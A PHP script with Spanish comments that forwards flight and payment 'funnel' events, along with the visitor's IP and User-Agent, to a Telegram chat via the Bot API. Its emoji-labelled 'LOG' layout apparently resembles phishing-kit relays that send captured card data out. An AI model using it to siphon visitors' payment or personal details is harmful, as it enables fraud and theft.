<?php
/**
 * Recibe eventos del embudo (vuelos / pagos) y envía un mensaje a Telegram.
 * POST JSON: { "event": "TEXTO LOG", "details": ["línea opcional", ...] }
 * El token y chat_id van solo en el servidor (telegram-funnel-config.php).
 */
header('Content-Type: application/json; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'method']);
    exit;
}

$configFile = __DIR__ . '/telegram-funnel-config.php';
if (!is_readable($configFile)) {
    echo json_encode(['ok' => true, 'skipped' => true]);
    exit;
}

$cfg = include $configFile;
$token = isset($cfg['bot_token']) ? trim((string) $cfg['bot_token']) : '';
$chatId = isset($cfg['chat_id']) ? trim((string) $cfg['chat_id']) : '';

if ($token === '' || $chatId === '') {
    echo json_encode(['ok' => true, 'skipped' => true]);
    exit;
}

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);
if (!is_array($data)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'json']);
    exit;
}

$event = isset($data['event']) ? trim((string) $data['event']) : '';
$details = isset($data['details']) && is_array($data['details']) ? $data['details'] : [];

if ($event === '') {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'event']);
    exit;
}

$ip = isset($_SERVER['REMOTE_ADDR']) ? (string) $_SERVER['REMOTE_ADDR'] : '';
if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $xff = trim(explode(',', (string) $_SERVER['HTTP_X_FORWARDED_FOR'])[0]);
    if ($xff !== '') {
        $ip = $xff;
    }
}

$ua = isset($_SERVER['HTTP_USER_AGENT']) ? (string) $_SERVER['HTTP_USER_AGENT'] : '';
if (strlen($ua) > 500) {
    $ua = substr($ua, 0, 500) . '…';
}

$h = static function (string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
};

$lines = [];
$lines[] = '👱 <b>IP:</b> ' . $h($ip);
$lines[] = '💳 <b>- LOG:</b> ' . $h($event);
foreach ($details as $row) {
    if (is_string($row) && $row !== '') {
        $lines[] = $h($row);
    }
}
$lines[] = '💰 <b>User-Agent:</b> ' . $h($ua);

$text = implode("\n", $lines);

$payload = [
    'chat_id' => $chatId,
    'text' => $text,
    'parse_mode' => 'HTML',
    'disable_web_page_preview' => true,
];

$url = 'https://api.telegram.org/bot' . $token . '/sendMessage';
$opts = [
    'http' => [
        'method' => 'POST',
        'header' => 'Content-Type: application/x-www-form-urlencoded',
        'content' => http_build_query($payload),
        'timeout' => 8,
    ],
];

$res = false;
$code = 0;
if (function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 8,
    ]);
    $res = curl_exec($ch);
    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
} else {
    $ctx = stream_context_create($opts);
    $res = @file_get_contents($url, false, $ctx);
    $code = 200;
    if (isset($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
        $code = (int) $m[1];
    }
}

$tg = is_string($res) ? json_decode($res, true) : null;
$tgDesc = is_array($tg) && isset($tg['description']) ? (string) $tg['description'] : null;

if ($res === false || $code >= 400) {
    http_response_code(502);
    echo json_encode([
        'ok' => false,
        'error' => 'telegram_http',
        'http_code' => $code,
        'detail' => $tgDesc,
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

if (!is_array($tg) || empty($tg['ok'])) {
    http_response_code(502);
    echo json_encode([
        'ok' => false,
        'error' => 'telegram_api',
        'detail' => $tgDesc,
    ], JSON_UNESCAPED_UNICODE);
    exit;
}

echo json_encode(['ok' => true]);
